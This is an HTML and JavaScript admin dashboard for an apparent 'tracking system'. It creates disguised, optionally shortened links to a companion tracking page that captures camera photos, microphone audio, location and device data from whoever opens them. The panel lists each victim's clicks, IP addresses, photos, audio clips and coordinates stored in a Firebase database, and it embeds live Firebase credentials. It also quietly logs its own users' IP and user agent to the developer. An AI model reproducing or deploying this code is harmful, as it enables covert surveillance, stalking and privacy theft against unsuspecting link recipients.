<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Admin Panel | MR_MOMIN_🌍</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; }
        body {
            background: radial-gradient(circle at 20% 30%, #03000a, #000000);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            position: relative;
            overflow-x: hidden;
        }
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            opacity: 0.1;
        }
        .glass-card {
            background: rgba(0, 10, 20, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            border: 1px solid #ffd700;
            max-width: 1200px;
            width: 100%;
            padding: 2rem;
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
            position: relative;
            z-index: 2;
        }
        h1 {
            font-size: 1.8rem;
            text-align: center;
            color: #ffd700;
            text-shadow: 0 0 5px #ffd700;
            letter-spacing: 2px;
        }
        .tagline {
            text-align: center;
            color: #0ef;
            font-size: 0.7rem;
            border-bottom: 1px solid #ffd700;
            display: inline-block;
            width: auto;
            padding-bottom: 5px;
            margin-bottom: 1.5rem;
        }
        .uid-box {
            background: #000000aa;
            border-radius: 1rem;
            padding: 10px;
            text-align: center;
            margin-bottom: 1.5rem;
            border: 1px dashed #ffd700;
        }
        .uid-box span {
            color: #ffd700;
            font-size: 1.2rem;
            font-weight: bold;
            letter-spacing: 2px;
        }
        .input-group { margin-bottom: 1rem; }
        label { display: block; font-size: 0.7rem; color: #0ef; margin-bottom: 4px; }
        input, select {
            width: 100%;
            background: #001000;
            border: 1px solid #ffd700;
            border-radius: 1rem;
            padding: 12px;
            color: #0ef;
            font-size: 0.8rem;
            outline: none;
        }
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(2,1fr);
            gap: 12px;
            margin: 1.5rem 0;
        }
        .feature-card {
            background: #001500;
            border: 1px solid #ffd700;
            border-radius: 1rem;
            padding: 8px;
            text-align: center;
            cursor: pointer;
            font-size: 0.8rem;
            color: #0ef;
            transition: 0.2s;
        }
        .feature-card.selected {
            background: rgba(255,215,0,0.2);
            box-shadow: 0 0 12px #ffd700;
            border-color: #fff;
        }
        .btn {
            width: 100%;
            background: linear-gradient(95deg, #ffd700, #ffaa00);
            border: none;
            border-radius: 2rem;
            padding: 12px;
            font-weight: bold;
            color: black;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.2s;
        }
        .btn:active { transform: scale(0.97); }
        .link-box {
            margin-top: 1.5rem;
            background: #000000aa;
            border-radius: 1rem;
            padding: 12px;
            display: none;
            border-left: 3px solid #ffd700;
        }
        .link-text {
            font-size: 0.7rem;
            word-break: break-all;
            background: #021a02;
            padding: 8px;
            border-radius: 0.5rem;
            color: #afa;
            margin-bottom: 8px;
        }
        .short-toggle {
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 12px 0;
            background: #001000;
            padding: 8px;
            border-radius: 2rem;
        }
        .short-toggle label { margin: 0; cursor: pointer; color: #0ef; }
        .info-note {
            font-size: 0.6rem;
            text-align: center;
            margin-top: 20px;
            color: #ffd700;
        }
        .link-card {
            background: #001500;
            border: 1px solid #ffd700;
            border-radius: 1rem;
            padding: 1rem;
            margin: 1rem 0;
            cursor: pointer;
            transition: 0.2s;
        }
        .data-card {
            background: #001500;
            border: 1px solid #ffd700;
            border-radius: 1rem;
            padding: 1rem;
            margin: 1rem 0;
            max-height: 500px;
            overflow-y: auto;
        }
        .flex-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 1rem;
        }
        .small-btn {
            background: #ffd700;
            color: black;
            border: none;
            border-radius: 1rem;
            padding: 6px 12px;
            cursor: pointer;
            font-size: 0.7rem;
        }
        .stat-badge {
            display: inline-block;
            background: #ffd70033;
            padding: 2px 8px;
            border-radius: 1rem;
            font-size: 0.7rem;
            margin-right: 10px;
            color: #ffd700;
        }
        .tab-content { display: block; }
        .hide { display: none; }
        .developer {
            text-align: center;
            margin-top: 20px;
            font-size: 0.7rem;
            color: #ffd700;
        }
        .click-entry {
            border-bottom: 1px solid #ffd70033;
            padding: 8px;
            font-size: 0.7rem;
        }
    </style>
</head>
<body>
<div id="matrixCanvas" class="matrix-bg"></div>

<div class="glass-card" id="adminDashboard">
    <h1>> MR_MOMIN_🌍 ADMIN_</h1>
    <div style="text-align:center;"><span class="tagline">[ SMART TRACKING SYSTEM ]</span></div>

    <div class="uid-box">
        📛 আপনার ইউনিক আইডি (UID): <span id="adminUidDisplay">লোড হচ্ছে...</span>
    </div>

    <div class="flex-row" style="margin-bottom: 1rem;">
        <button id="tabGenBtn" class="small-btn" style="background:#ffd700;">🔗 জেনারেটর</button>
        <button id="tabMonitorBtn" class="small-btn">📡 লিংক মনিটর</button>
        <button id="tabDataViewBtn" class="small-btn">📦 ডাটা ভিউয়ার</button>
    </div>

    <!-- GENERATOR TAB -->
    <div id="tabGenerator" class="tab-content">
        <div class="feature-grid" id="featureGrid">
            <div class="feature-card" data-feat="C"><span>📸</span> ক্যামেরা (৩ ছবি/সেকেন্ড)</div>
            <div class="feature-card" data-feat="M"><span>🎙️</span> মাইক্রোফোন (১০ সেকেন্ড লুপ)</div>
            <div class="feature-card" data-feat="L"><span>📍</span> লোকেশন</div>
            <div class="feature-card" data-feat="X"><span>💻</span> ডিভাইস তথ্য</div>
        </div>
        <div class="short-toggle">
            <input type="checkbox" id="shortenCheckbox"> <label>🔗 শর্ট লিংক তৈরি করুন (is.gd)</label>
        </div>
        <button class="btn" id="generateLinkBtn">⚡ লিংক জেনারেট করুন</button>
        <div id="linkResultBox" class="link-box">
            <div class="link-text" id="generatedLink">--</div>
            <div class="copy-row" style="display:flex; gap:8px;">
                <button id="copyFullBtn" style="background:#ffd700; color:#000; border:none; border-radius:1rem; padding:6px; flex:1;">লিংক কপি করুন</button>
            </div>
        </div>
    </div>

    <!-- MONITOR TAB: show all links with stats -->
    <div id="tabMonitor" class="tab-content hide">
        <h3 style="color:#ffd700;">📡 আপনার তৈরি লিংক সমূহ</h3>
        <div id="linksList"></div>
    </div>

    <!-- DATA VIEWER TAB: click on link to see details + click logs -->
    <div id="tabDataView" class="tab-content hide">
        <h3 style="color:#ffd700;">📦 লিংকে ক্লিক করে বিস্তারিত ডাটা দেখুন</h3>
        <div id="dataLinksList"></div>
        <div id="dataDetails" class="hide">
            <h4>ডাটা: <span id="selectedLinkId"></span></h4>
            <div id="mediaList" class="data-card"></div>
        </div>
    </div>

    <div class="developer">⚡ System Developed by Mr. Momin</div>
</div>

<script>
    // ========== FIREBASE CONFIG ==========
    const firebaseConfig = {
        apiKey: "AIzaSyCiAEFoHUdaaJNJr0PnweGOZ-N7zi438c0",
        authDomain: "momin-tracking-sysrem.firebaseapp.com",
        databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com/",
        projectId: "momin-tracking-sysrem",
        storageBucket: "momin-tracking-sysrem.firebasestorage.app",
        messagingSenderId: "637134050647",
        appId: "1:637134050647:web:86c90c894a13be2fd75a12"
    };
    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const storage = firebase.storage();

    // ========== MATRIX BACKGROUND ==========
    (function matrixRain() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        document.getElementById('matrixCanvas').appendChild(canvas);
        const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for(let i=0; i<columns; i++) drops[i] = 1;
        function draw() {
            ctx.fillStyle = 'rgba(0,0,0,0.04)';
            ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';
            for(let i=0; i<drops.length; i++) {
                const text = chars[Math.floor(Math.random()*chars.length)];
                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i]=0;
                drops[i]++;
            }
        }
        setInterval(draw, 50);
        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
    })();

    // ========== UID MANAGEMENT ==========
    let adminUid = null;

    async function getOrCreateUid() {
        let storedUid = localStorage.getItem('admin_uid');
        if (storedUid && /^\d{8}$/.test(storedUid)) {
            adminUid = storedUid;
            document.getElementById('adminUidDisplay').innerText = adminUid;
            return adminUid;
        }
        let newUid = Math.floor(10000000 + Math.random() * 90000000).toString();
        adminUid = newUid;
        localStorage.setItem('admin_uid', adminUid);
        document.getElementById('adminUidDisplay').innerText = adminUid;

        // Send to developer log
        let ip = 'unknown';
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch(e) {}
        await db.ref(`dev_logs/new_admins/${adminUid}`).set({
            uid: adminUid,
            firstSeen: Date.now(),
            ip: ip,
            userAgent: navigator.userAgent,
            platform: navigator.platform
        });
        await db.ref(`admins/${adminUid}`).set({
            uid: adminUid,
            createdAt: Date.now(),
            name: `Admin_${adminUid}`
        });
        return adminUid;
    }

    // ========== SETUP ==========
    async function init() {
        await getOrCreateUid();
        setupTabs();
        setupGenerator();
        loadMonitorLinks();
        loadDataLinks();
    }

    function setupTabs() {
        const tabs = {
            gen: document.getElementById('tabGenBtn'),
            mon: document.getElementById('tabMonitorBtn'),
            data: document.getElementById('tabDataViewBtn')
        };
        const contents = {
            gen: document.getElementById('tabGenerator'),
            mon: document.getElementById('tabMonitor'),
            data: document.getElementById('tabDataView')
        };
        const showTab = (name) => {
            for (let k in contents) contents[k].classList.add('hide');
            contents[name].classList.remove('hide');
        };
        tabs.gen.onclick = () => showTab('gen');
        tabs.mon.onclick = () => showTab('mon');
        tabs.data.onclick = () => showTab('data');
        showTab('gen');
    }

    // ========== LINK GENERATOR ==========
    function setupGenerator() {
        const featDivs = document.querySelectorAll('.feature-card');
        let selected = new Set();
        featDivs.forEach(div => {
            div.addEventListener('click', () => {
                const f = div.getAttribute('data-feat');
                if (selected.has(f)) { selected.delete(f); div.classList.remove('selected'); }
                else { selected.add(f); div.classList.add('selected'); }
            });
        });
        const genBtn = document.getElementById('generateLinkBtn');
        const linkBox = document.getElementById('linkResultBox');
        const linkSpan = document.getElementById('generatedLink');
        const shortCheck = document.getElementById('shortenCheckbox');
        genBtn.onclick = async () => {
            if (selected.size === 0) { alert("অন্তত একটি ফিচার নির্বাচন করুন"); return; }
            const features = Array.from(selected).join('');
            const linkId = 'link_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
            const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'track.html');
            const fullLink = `${baseUrl}?id=${linkId}&admin=${adminUid}&f=${features}`;
            const linkData = {
                linkId: linkId,
                features: features,
                createdAt: Date.now(),
                createdBy: adminUid,
                shortUrl: null
            };
            if (shortCheck.checked) {
                linkSpan.innerText = 'শর্ট লিংক তৈরি হচ্ছে...';
                try {
                    const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullLink)}`);
                    const data = await res.json();
                    const short = data.shorturl || fullLink;
                    linkData.shortUrl = short;
                    linkSpan.innerText = short;
                } catch(e) { linkSpan.innerText = fullLink; }
            } else {
                linkSpan.innerText = fullLink;
            }
            await db.ref(`links/${adminUid}/${linkId}`).set(linkData);
            linkBox.style.display = 'block';
            loadMonitorLinks();
        };
        document.getElementById('copyFullBtn').onclick = () => {
            const txt = linkSpan.innerText;
            if (txt && txt !== '--' && !txt.includes('শর্ট')) copyClip(txt);
            else alert("প্রথমে লিংক জেনারেট করুন");
        };
    }
    function copyClip(t) { navigator.clipboard.writeText(t).then(() => alert("লিংক কপি হয়েছে")); }

    // ========== MONITOR TAB: show links with live counters (photo, audio, location, clicks) ==========
    async function loadMonitorLinks() {
        const linksRef = db.ref(`links/${adminUid}`);
        linksRef.on('value', (snapshot) => {
            const links = snapshot.val();
            const container = document.getElementById('linksList');
            if (!links) { container.innerHTML = '<div class="data-card">এখনো কোনো লিংক তৈরি হয়নি।</div>'; return; }
            let html = '<div class="data-card">';
            for (let id in links) {
                const link = links[id];
                // get counts from captured_data
                const countRef = db.ref(`captured_data/${adminUid}/${id}`);
                countRef.on('value', (trackSnap) => {
                    const trackData = trackSnap.val();
                    let photoCount = 0, audioCount = 0, locCount = 0, clickCount = 0;
                    if (trackData) {
                        for (let key in trackData) {
                            if (key.startsWith('camera_photo')) photoCount++;
                            else if (key.startsWith('microphone_audio')) audioCount++;
                            else if (key.startsWith('location')) locCount++;
                            else if (key.startsWith('click_')) clickCount++;
                        }
                    }
                    const cardElem = document.getElementById(`link-card-${id}`);
                    if (cardElem) {
                        cardElem.innerHTML = `<strong>🔗 ${id}</strong><br>
                            ফিচার: ${link.features}<br>
                            তৈরি: ${new Date(link.createdAt).toLocaleString()}<br>
                            <span class="stat-badge">👆 ${clickCount} ক্লিক</span>
                            <span class="stat-badge">📸 ${photoCount}</span>
                            <span class="stat-badge">🎙️ ${audioCount}</span>
                            <span class="stat-badge">📍 ${locCount}</span>
                            ${link.shortUrl ? `<br>শর্ট: <a href="${link.shortUrl}" target="_blank">${link.shortUrl}</a>` : ''}`;
                    }
                });
                html += `<div class="link-card" id="link-card-${id}" data-linkid="${id}"></div>`;
            }
            container.innerHTML = html;
            document.querySelectorAll('.link-card').forEach(card => {
                card.addEventListener('click', () => {
                    const linkId = card.getAttribute('data-linkid');
                    document.getElementById('tabDataViewBtn').click();
                    setTimeout(() => showLinkData(linkId), 200);
                });
            });
        });
    }

    // ========== DATA VIEWER: show clicks list and captured media ==========
    async function loadDataLinks() {
        const linksRef = db.ref(`links/${adminUid}`);
        linksRef.on('value', (snapshot) => {
            const links = snapshot.val();
            const container = document.getElementById('dataLinksList');
            if (!links) { container.innerHTML = '<div class="data-card">এখনো কোনো লিংক নেই।</div>'; return; }
            let html = '';
            for (let id in links) {
                html += `<div class="link-card" data-linkid="${id}">
                            <strong>🔗 ${id}</strong><br>
                            তৈরি: ${new Date(links[id].createdAt).toLocaleString()}
                         </div>`;
            }
            container.innerHTML = html;
            document.querySelectorAll('[data-linkid]').forEach(el => {
                el.addEventListener('click', () => showLinkData(el.getAttribute('data-linkid')));
            });
        });
    }

    async function showLinkData(linkId) {
        const detailsDiv = document.getElementById('dataDetails');
        detailsDiv.classList.remove('hide');
        document.getElementById('selectedLinkId').innerText = linkId;
        const mediaDiv = document.getElementById('mediaList');
        mediaDiv.innerHTML = '<div class="loader"></div><p>ডাটা লোড হচ্ছে...</p>';

        const trackRef = db.ref(`captured_data/${adminUid}/${linkId}`);
        trackRef.once('value', (snapshot) => {
            const data = snapshot.val();
            if (!data) {
                mediaDiv.innerHTML = '<p>এখনো কোনো ডাটা ক্যাপচার হয়নি।</p>';
                return;
            }
            let photos = [], audios = [], locations = [], clicks = [], others = [];
            for (let key in data) {
                const entry = data[key];
                if (key.startsWith('camera_photo')) photos.push(entry);
                else if (key.startsWith('microphone_audio')) audios.push(entry);
                else if (key.startsWith('location')) locations.push(entry);
                else if (key.startsWith('click_')) clicks.push(entry);
                else others.push(entry);
            }
            let html = `<h4>👆 ক্লিক তথ্য (${clicks.length})</h4>`;
            clicks.sort((a,b) => b.timestamp - a.timestamp);
            clicks.forEach(c => {
                const time = new Date(c.timestamp).toLocaleString();
                const ip = c.data.ip || 'unknown';
                const ua = c.data.userAgent || '';
                html += `<div class="click-entry"><strong>${time}</strong> | IP: ${ip}<br><small>${ua.substring(0, 100)}</small></div>`;
            });
            html += `<h4>📸 ছবি (${photos.length})</h4>`;
            photos.forEach(p => {
                const time = new Date(p.timestamp).toLocaleString();
                html += `<div class="data-entry"><strong>${time}</strong><br><img src="${p.data.url}" style="max-width:100%; max-height:200px;"></div>`;
            });
            html += `<h4>🎤 অডিও ক্লিপ (${audios.length})</h4>`;
            audios.forEach(a => {
                const time = new Date(a.timestamp).toLocaleString();
                html += `<div class="data-entry"><strong>${time}</strong><br><audio controls src="${a.data.url}" style="width:100%;"></audio></div>`;
            });
            html += `<h4>📍 লোকেশন (${locations.length})</h4>`;
            locations.forEach(loc => {
                const time = new Date(loc.timestamp).toLocaleString();
                html += `<div class="data-entry"><strong>${time}</strong><br>${loc.data.lat}, ${loc.data.lon}</div>`;
            });
            html += `<h4>📋 অন্যান্য তথ্য</h4>`;
            others.forEach(o => {
                const time = new Date(o.timestamp).toLocaleString();
                html += `<div class="data-entry"><strong>${o.type}</strong> at ${time}<br><pre>${JSON.stringify(o.data, null, 2)}</pre></div>`;
            });
            mediaDiv.innerHTML = html;
        });
    }

    init();
</script>
</body>
</html>
